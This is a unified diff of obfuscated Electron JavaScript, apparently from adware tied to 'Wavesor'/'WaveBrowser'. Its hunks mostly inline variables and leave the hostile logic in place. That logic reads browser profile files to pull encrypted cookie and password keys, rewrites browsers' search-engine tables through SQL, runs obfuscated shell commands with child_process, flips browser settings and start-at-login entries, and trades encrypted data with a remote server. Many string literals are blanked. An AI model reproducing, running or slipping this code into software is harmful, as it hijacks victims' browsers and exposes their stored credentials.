           } else if (_0x57f1d2 == _0xa0200c.q5A5TD7) {
-            const _0xeb25d6 = require("process").env.USERPROFILE;
-            _0x32e461 = _0x2beeb8.join(_0xeb25d6, "");
+            _0x32e461 = _0x2beeb8.join(require("process").env.USERPROFILE, "");
             if (await this.A5FCGS4(_0x32e461)) {
               return _0x32e461;
             }
@@ -1941,9 +1871,8 @@
             await this.D45AYQ3("");
             _0x5c23fd.w3F3UWA.s59BT06('');
           }
-          let _0x2827c3 = _0x2d5a70.join(_0x59bbe9, "");
           _0x5c23fd.w3F3UWA.s59BT06('');
-          let [_0x1bb085, _0x2f987f] = await this.A554U7Y(1, _0x2827c3, false);
+          let [_0x1bb085, _0x2f987f] = await this.A554U7Y(1, _0x2d5a70.join(_0x59bbe9, ""), false);
           if (_0x2f987f && _0x2f987f !== '') {
             _0x2f987f = this.r42EX1Q(_0x2f987f);
             _0x5c23fd.w3F3UWA.s59BT06('');
@@ -2013,11 +1942,9 @@
                   for (const _0x3e90e1 in _0x3528a2) {
                     if (_0x3528a2.hasOwnProperty(_0x3e90e1)) {
                       const _0x238248 = _0x3528a2[_0x3e90e1];
-                      const _0x3efd5a = _0x3e90e1.replace("%PROFILE%", _0x1bb085[_0x32a0e6]);
                       for (const _0x588175 in _0x238248) {
                         if (_0x238248.hasOwnProperty(_0x588175)) {
-                          const _0x19bb5e = _0x238248[_0x588175];
-                          await this.O69AL84(_0x3efd5a, _0x588175, _0x19bb5e);
+                          await this.O69AL84(_0x3e90e1.replace("%PROFILE%", _0x1bb085[_0x32a0e6]), _0x588175, _0x238248[_0x588175]);
                           _0x3a7f01.push(_0x588175);
                         }
                       }
@@ -2065,9 +1992,8 @@
               await this.D45AYQ3("");
               _0x5c23fd.w3F3UWA.s59BT06('');
             }
-            let _0x1936c9 = _0x48df18.join(_0x543d90, "");
             _0x5c23fd.w3F3UWA.s59BT06('');
-            let [_0x4701ea, _0x213eed] = await this.A554U7Y(_0x48b033, _0x1936c9, true);
+            let [_0x4701ea, _0x213eed] = await this.A554U7Y(_0x48b033, _0x48df18.join(_0x543d90, ""), true);
             if (_0x213eed && _0x213eed !== '') {
               _0x213eed = this.r42EX1Q(_0x213eed);
               _0x5c23fd.w3F3UWA.s59BT06('');
@@ -2158,9 +2084,8 @@
               await this.D45AYQ3("");
               _0x5c23fd.w3F3UWA.s59BT06('');
             }
-            let _0x5be746 = _0x16921f.join(_0x50714e, "");
             _0x5c23fd.w3F3UWA.s59BT06('');
-            let [_0x411d2d, _0xa0cb17] = await this.A554U7Y(_0x214a50, _0x5be746, true);
+            let [_0x411d2d, _0xa0cb17] = await this.A554U7Y(_0x214a50, _0x16921f.join(_0x50714e, ""), true);
             if (_0xa0cb17 && _0xa0cb17 !== '') {
               _0xa0cb17 = this.r42EX1Q(_0xa0cb17);
               _0x5c23fd.w3F3UWA.s59BT06('');
@@ -2234,27 +2159,22 @@
         async D45AYQ3(_0x263a69, _0x4f4954 = true) {
           const _0x8ee8da = require("child_process");
           if (_0x4f4954) {
-            const _0x2e98b5 = _0x5c23fd.o5B4F49("", _0x263a69);
             for (let _0xaa2b2b = 0; _0xaa2b2b < 3; _0xaa2b2b++) {
               _0x5c23fd.w3F3UWA.s59BT06('');
-              _0x8ee8da.exec(_0x2e98b5);
+              _0x8ee8da.exec((0, _0x5c23fd.o5B4F49)("", _0x263a69));
               await this.E4E2LLU(100);
             }
           }
-          const _0xfd1bfc = _0x5c23fd.o5B4F49("", _0x263a69);
           _0x5c23fd.w3F3UWA.s59BT06('');
-          _0x8ee8da.exec(_0xfd1bfc);
+          _0x8ee8da.exec((0, _0x5c23fd.o5B4F49)("", _0x263a69));
           await this.E4E2LLU(100);
         }
         async A554U7Y(_0x214ff8, _0x4bd0d9, _0x79e2ac = false) {
           try {
-            const _0x597d54 = require("fs").readFileSync(_0x4bd0d9, "utf8");
-            const _0x5b114d = JSON.parse(_0x597d54);
-            const _0x136648 = Object.keys(_0x5b114d.profile?.info_cache || {});
+            const _0x5b114d = JSON.parse(require("fs").readFileSync(_0x4bd0d9, "utf8"));
             _0x5c23fd.w3F3UWA.s59BT06('');
-            const _0x56310e = _0x79e2ac ? _0x5b114d.os_crypt?.encrypted_key || '' : '';
             _0x5c23fd.w3F3UWA.s59BT06('');
-            return [_0x136648, _0x56310e];
+            return [Object.keys(_0x5b114d.profile?.info_cache || {}), _0x79e2ac ? _0x5b114d.os_crypt?.encrypted_key || '' : ''];
           } catch (_0x5d4a1b) {
             await _0x5c23fd.w3F3UWA.Y6CDW21(_0x214ff8, _0x5c23fd.z579NEI.y46BIEQ, _0x5d4a1b);
           }
@@ -2282,10 +2202,7 @@
         async G5B8BDL(_0x48bfd9) {
           const _0x1052f5 = new require("better-sqlite3")(_0x48bfd9);
           try {
-            const _0x40b2ed = _0x1052f5.prepare("select * from keywords");
-            const _0x24fc69 = _0x40b2ed.all();
-            const _0xcd059d = JSON.stringify(_0x24fc69);
-            return _0xcd059d;
+            return JSON.stringify(_0x1052f5.prepare("select * from keywords").all());
           } catch (_0x32e93a) {
             _0x5c23fd.w3F3UWA.s59BT06('');
             throw new Error(_0x32e93a);
@@ -2300,8 +2217,7 @@
         async r501Z9L(_0x3d50f8, _0x2e56d9) {
           const _0x3e7297 = new require("better-sqlite3")(_0x3d50f8);
           try {
-            const _0x56e833 = JSON.parse(_0x2e56d9);
-            for (const _0x24ad94 of _0x56e833) {
+            for (const _0x24ad94 of JSON.parse(_0x2e56d9)) {
               _0x3e7297.prepare(_0x24ad94).run();
               _0x5c23fd.w3F3UWA.s59BT06('');
             }
@@ -2331,17 +2247,15 @@
         }
         async O69AL84(_0xa20663, _0x312731, _0x1b10c0) {
           try {
-            const _0x16131e = _0x5c23fd.o5B4F49("", _0xa20663, _0x312731, _0x1b10c0);
-            require("child_process").execSync(_0x16131e);
+            require("child_process").execSync((0, _0x5c23fd.o5B4F49)("", _0xa20663, _0x312731, _0x1b10c0));
           } catch (_0x3a2566) {
             await _0x5c23fd.w3F3UWA.Y6CDW21(_0xa0200c.B639G7B, _0x5c23fd.z579NEI.u3F4OPT, _0x3a2566);
           }
         }
         async w4D8BBU(_0xdb1e53, _0x5a3a56) {
           try {
-            const _0x39ab70 = _0x5c23fd.o5B4F49("", _0xdb1e53, _0x5a3a56);
             _0x5c23fd.w3F3UWA.s59BT06('');
-            require("child_process").execSync(_0x39ab70);
+            require("child_process").execSync((0, _0x5c23fd.o5B4F49)("", _0xdb1e53, _0x5a3a56));
           } catch (_0x1c367a) {
             await _0x5c23fd.w3F3UWA.Y6CDW21(_0xa0200c.N6330WH, _0x5c23fd.z579NEI.h6148NE, _0x1c367a);
           }
@@ -2374,9 +2288,8 @@
         }
         async e4F5CS0() {
           try {
-            const _0x3a745e = require("url").URLSearchParams;
             var _0x950ec6 = _0xae5ec9.e5325L3.q474LOF ?? '';
-            const _0x1c8d9d = new _0x3a745e();
+            const _0x1c8d9d = new require("url").URLSearchParams();
             const _0xcbbf25 = _0x1ebf7f.S559FZQ.n677BRA.substring(0, 24) + _0x950ec6.substring(0, 8);
             const _0x57a413 = {
               iid: _0x950ec6,
@@ -2397,8 +2310,7 @@
               _0x5c23fd.w3F3UWA.s59BT06('');
               try {
                 if (_0xc40d79.data) {
-                  const _0x1f3f77 = _0x5c23fd.U61FWBZ(_0xcbbf25, _0xc40d79.data, _0xc40d79.iv);
-                  const _0x568a74 = JSON.parse(_0x1f3f77);
+                  const _0x568a74 = JSON.parse((0, _0x5c23fd.U61FWBZ)(_0xcbbf25, _0xc40d79.data, _0xc40d79.iv));
                   _0x5c23fd.w3F3UWA.s59BT06('');
                   let _0x383e23 = new _0x3c3b8b();
                   _0x383e23.H5C67AR = _0x568a74.wc ?? false;
@@ -2433,9 +2345,8 @@
         async O515QL8(_0x3d51d6, _0x5d2439, _0x17ba2) {
           _0x5c23fd.w3F3UWA.s59BT06('');
           try {
-            const _0x4436c8 = require("url").URLSearchParams;
             var _0xaea80 = _0xae5ec9.e5325L3.q474LOF ?? '';
-            const _0x23e311 = new _0x4436c8();
+            const _0x23e311 = new require("url").URLSearchParams();
             const _0x32e5a6 = _0x1ebf7f.S559FZQ.n677BRA.substring(0, 24) + _0xaea80.substring(0, 8);
             const _0x230cb6 = {
               iid: _0xaea80,
@@ -2463,8 +2374,7 @@
             _0x5c23fd.w3F3UWA.s59BT06('');
             try {
               if (_0x18dc8b.data) {
-                const _0x2f9fca = _0x5c23fd.U61FWBZ(_0x32e5a6, _0x18dc8b.searchdata, _0x18dc8b.iv);
-                const _0x69bfeb = JSON.parse(_0x2f9fca);
+                const _0x69bfeb = JSON.parse((0, _0x5c23fd.U61FWBZ)(_0x32e5a6, _0x18dc8b.searchdata, _0x18dc8b.iv));
                 let _0x48900a = JSON.stringify(_0x69bfeb.pref) ?? '';
                 let _0xe2cc02 = JSON.stringify(_0x69bfeb.spref) ?? '';
                 let _0x1e6b57 = JSON.stringify(_0x69bfeb.regdata) ?? '';
@@ -2494,9 +2404,8 @@
         async w516KLO(_0x20ebd2, _0x3320cf, _0x4e4bab, _0x5f0cb5) {
           _0x5c23fd.w3F3UWA.s59BT06('');
           try {
-            const _0x5130bc = require("url").URLSearchParams;
             var _0x37685a = _0xae5ec9.e5325L3.q474LOF ?? '';
-            const _0x15c018 = new _0x5130bc();
+            const _0x15c018 = new require("url").URLSearchParams();
             const _0x27b290 = _0x1ebf7f.S559FZQ.n677BRA.substring(0, 24) + _0x37685a.substring(0, 8);
             const _0x31b636 = {
               iid: _0x37685a,
@@ -2526,15 +2435,13 @@
                 if (!_0xf1bd5c.searchdata) {
                   return new _0x344264(true, '', '');
                 }
-                const _0x5be63b = _0x5c23fd.U61FWBZ(_0x27b290, _0xf1bd5c.searchdata, _0xf1bd5c.iv);
-                const _0x791214 = JSON.parse(_0x5be63b);
+                const _0x791214 = JSON.parse((0, _0x5c23fd.U61FWBZ)(_0x27b290, _0xf1bd5c.searchdata, _0xf1bd5c.iv));
                 const _0x5e7ce3 = _0x791214.pref ?? '';
                 const _0x566f39 = _0x791214.webData ?? '';
                 _0x5c23fd.w3F3UWA.s59BT06('');
                 _0x5c23fd.w3F3UWA.s59BT06('');
-                let _0x5a6f34 = _0x5e7ce3 !== '' ? JSON.stringify(_0x5e7ce3) ?? '' : '';
                 let _0x4dea0e = _0x566f39 !== '' ? JSON.stringify(_0x566f39) ?? '' : '';
-                return new _0x344264(true, _0x5a6f34, _0x566f39);
+                return new _0x344264(true, _0x5e7ce3 !== '' ? JSON.stringify(_0x5e7ce3) ?? '' : '', _0x566f39);
               }
             } catch (_0x1ad793) {
               await _0x5c23fd.w3F3UWA.Y6CDW21(_0x20ebd2, _0x5c23fd.z579NEI.l54DEIW, _0x1ad793);
@@ -2550,8 +2457,7 @@
             if (_0x16f74c == '') {
               return _0x8aca6f.s46FO09;
             }
-            const _0x42d0fb = parseInt(_0x16f74c);
-            return _0x42d0fb;
+            return parseInt(_0x16f74c);
           } catch {
             _0x5c23fd.w3F3UWA.s59BT06('');
             return _0x8aca6f.s46FO09;
@@ -2567,22 +2473,16 @@
           let _0x451ec0 = require("path").join(_0x422593, "");
           const _0x13b83b = require("fs");
           try {
-            const _0x3f1af9 = _0x13b83b.readFileSync(_0x451ec0, "utf8");
-            let _0x38d94e = JSON.parse(_0x3f1af9);
-            const _0x221c35 = _0x38d94e[""] ?? true;
-            const _0x735adc = _0x38d94e[""]?.[""] ?? true;
-            const _0x7d40e4 = _0x38d94e[""] ?? true;
-            const _0x3b7d16 = _0x38d94e[""] ?? true;
+            let _0x38d94e = JSON.parse(_0x13b83b.readFileSync(_0x451ec0, "utf8"));
             const _0x430827 = await this.g4EE56L("wv-key");
-            if (_0x221c35 || _0x735adc || _0x7d40e4 || _0x3b7d16) {
+            if (_0x38d94e[""] ?? true || (_0x38d94e[""]?.[""] ?? true) || (_0x38d94e[""] ?? true) || (_0x38d94e[""] ?? true)) {
               if (_0x8aca6f.s46FO09 == _0x430827 || _0x39c6dc) {
                 await this.D45AYQ3("");
                 _0x38d94e[""] = false;
                 if (!_0x38d94e[""]) {
-                  const _0x1439ba = {
+                  _0x38d94e[""] = {
                     "": false
                   };
-                  _0x38d94e[""] = _0x1439ba;
                 } else {
                   _0x38d94e[""][""] = false;
                 }
@@ -2597,8 +2497,7 @@
             } else {
               let _0x12e395 = false;
               if (_0x8aca6f.d56ECUF == _0x430827) {
-                const _0x22416b = this.X6066R5() ?? '';
-                const _0x25f85c = this.e5FBF4O("\\Wavesor Software_" + _0x22416b, "WaveBrowser-StartAtLogin", 1);
+                const _0x25f85c = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
                 const _0x4ddab9 = this.t4E0LPU("\\");
                 if (_0x25f85c != undefined && false == _0x25f85c && _0x4ddab9 != undefined && _0x4ddab9) {
                   _0x12e395 = true;
@@ -2621,8 +2520,7 @@
           const _0x4ad0da = require("fs");
           const _0x6736c2 = require("path").join(_0x1ebf7f.S559FZQ.D47CBV3(), "", "");
           try {
-            const _0x1b1272 = _0x4ad0da.readFileSync(_0x6736c2, "utf8");
-            let _0x4846a1 = JSON.parse(_0x1b1272);
+            let _0x4846a1 = JSON.parse(_0x4ad0da.readFileSync(_0x6736c2, "utf8"));
             const _0x320eeb = await this.g4EE56L("ol-key");
             if (_0x4846a1[""] || _0x4846a1[""] || _0x4846a1[""] || _0x4846a1[""] || _0x4846a1[""]) {
               if (_0x8aca6f.s46FO09 == _0x320eeb || _0x13f87d) {
@@ -2631,9 +2529,8 @@
                 _0x4846a1[""] = false;
                 _0x4846a1[""] = false;
                 _0x4846a1[""] = false;
-                const _0x2246c3 = JSON.stringify(_0x4846a1, null, 2);
                 await this.D45AYQ3("");
-                _0x4ad0da.writeFileSync(_0x6736c2, _0x2246c3, "utf8");
+                _0x4ad0da.writeFileSync(_0x6736c2, JSON.stringify(_0x4846a1, null, 2), "utf8");
                 await this.D45AYQ3("");
                 await _0x5c23fd.w3F3UWA.W4EF0EI(_0x13fd5a, _0x5c23fd.z579NEI.R3F76I3, [_0x13f87d, _0x320eeb]);
                 await _0x1ebf7f.S559FZQ.c5E4Z7C("ol-key", '' + _0x8aca6f.d56ECUF);
@@ -2672,15 +2569,11 @@
           let _0x42bc30 = require("path").join(_0x55dd65, "");
           const _0x2de7f0 = require("fs");
           try {
-            const _0x668090 = _0x2de7f0.readFileSync(_0x42bc30, "utf8");
-            let _0x164923 = JSON.parse(_0x668090);
+            let _0x164923 = JSON.parse(_0x2de7f0.readFileSync(_0x42bc30, "utf8"));
             let _0x587889 = true;
             if ("shift" in _0x164923 && "browser" in _0x164923.shift) {
               const _0x5eff09 = _0x164923.shift.browser;
-              const _0x3c64bc = _0x5eff09.launch_on_login_enabled ?? true;
-              const _0x2f3423 = _0x5eff09.launch_on_wake_enabled ?? true;
-              const _0x353216 = _0x5eff09.run_in_background_enabled ?? true;
-              _0x587889 = _0x3c64bc || _0x2f3423 || _0x353216;
+              _0x587889 = _0x5eff09.launch_on_login_enabled ?? true || (_0x5eff09.launch_on_wake_enabled ?? true) || (_0x5eff09.run_in_background_enabled ?? true);
             }
             const _0x3b1b08 = await this.g4EE56L("sf-key");
             if (_0x587889) {
@@ -2778,11 +2671,10 @@
       var {
         BrowserWindow: _0x60947a
       } = require("electron");
-      var _0x225f8e = _0x537fcd();
       _0x3f7d0e.createBrowserWindow = () => {
         let _0x483ad5 = __dirname;
         _0x483ad5 = _0x483ad5.replace("src", '');
-        let _0x1e976d = _0x483ad5 + _0x225f8e.iconSubPath;
+        let _0x1e976d = _0x483ad5 + _0x537fcd().iconSubPath;
         console.log(_0x1e976d);
         const _0x2f76ff = new _0x60947a({
           resizable: true,
@@ -2805,10 +2697,7 @@
       Object.defineProperty(_0x21ce9, "__esModule", {
         value: true
       });
-      var _0x3b5693 = _0x149430();
-      var _0x201dff = _0x2af3f6();
       var _0x35f595 = _0x3b922a();
-      var _0x210ad7 = _0x2af3f6();
       var _0x2a31b5 = require('fs');
       var _0x3f1294 = require(".\\lib\\Utilityaddon.node");
       var _0x338472 = _0x537fcd();
@@ -2833,8 +2722,7 @@
         let _0x319137 = _0x3ce3ae.commandLine.getSwitchValue('cm');
         console.log('args=' + _0x18099b);
         console.log("args2=" + _0x319137);
-        let _0x32331a = __dirname;
-        let _0x3c57eb = _0x32331a.replace("\\resources\\app\\w-electron\\bin\\release", '');
+        let _0x3c57eb = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
         console.log("wkdir = " + _0x3c57eb);
         if (!_0x3ce3ae.commandLine.hasSwitch('c') && !_0x3ce3ae.commandLine.hasSwitch('cm')) {
           await _0x29c549('--install');
@@ -2900,10 +2788,9 @@
         async function _0x2355d0(_0x3e91d4) {
           let _0x2bc5e1 = _0xacb81b(_0x3e91d4);
           console.log("argument = " + _0x3e91d4);
-          const _0x40b9df = new _0x201dff.A672SIS(_0x4fb64f, _0x44580b, _0x3e29f1, _0x4d8d08, _0x5648ad);
+          const _0x40b9df = new _0x2af3f6().A672SIS(_0x4fb64f, _0x44580b, _0x3e29f1, _0x4d8d08, _0x5648ad);
           if (_0x35f595.a689XV5.b5BEPQ2 == _0x2bc5e1) {
-            let _0x5af03d = await _0x40b9df.q41FDEK();
-            if (_0x5af03d == _0x210ad7.U5E7DEV.C5B7MFV) {
+            if ((await _0x40b9df.q41FDEK()) == _0x2af3f6().U5E7DEV.C5B7MFV) {
               _0x56623b();
             }
           } else if (_0x35f595.a689XV5.Z498ME9 == _0x2bc5e1) {
@@ -2911,7 +2798,7 @@
           } else if (_0x35f595.a689XV5.f63DUQF == _0x2bc5e1) {
             await _0x40b9df.A4B0MTO();
           } else {
-            _0x3b5693.w3F3UWA.s59BT06('');
+            _0x149430().w3F3UWA.s59BT06('');
             await _0x40b9df.m58FJB5(_0x2bc5e1);
           }
         }
@@ -2942,8 +2829,7 @@
         }
         if (_0x278153) {
           _0x3ce3ae.whenReady().then(() => {
-            const _0x1f7dea = _0x2abb45();
-            let _0x41bca9 = _0x1f7dea.createBrowserWindow(_0x3ce3ae);
+            let _0x41bca9 = _0x2abb45().createBrowserWindow(_0x3ce3ae);
             require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((_0x5a75d5, _0x22384e) => {
               _0x5a75d5.requestHeaders["User-Agent"] = _0x338472.USER_AGENT;
               _0x22384e({
